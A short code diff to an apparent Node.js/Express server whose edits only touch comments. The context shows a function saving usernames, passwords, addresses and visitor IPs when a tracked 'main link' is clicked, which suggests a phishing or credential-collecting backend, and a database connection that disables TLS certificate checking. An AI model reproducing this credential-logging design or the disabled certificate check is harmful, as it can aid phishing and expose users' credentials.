@@ -12,7 +12,6 @@ const pool = new Pool({
     ssl: { rejectUnauthorized: false }
 });
 
-// Create Table
 pool.query(`CREATE TABLE IF NOT EXISTS records (
     id SERIAL PRIMARY KEY,
     type TEXT,
@@ -44,7 +43,7 @@ async function saveRecord(type, username = null, password = null, address = null
     }
 }
 
-// ==================== MAIN LINK CLICK ====================
+// ==================== MAIN LINK CLICK (Most Important) ====================
 app.get('/', async (req, res) => {
     const ip = getRealIP(req);
     await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
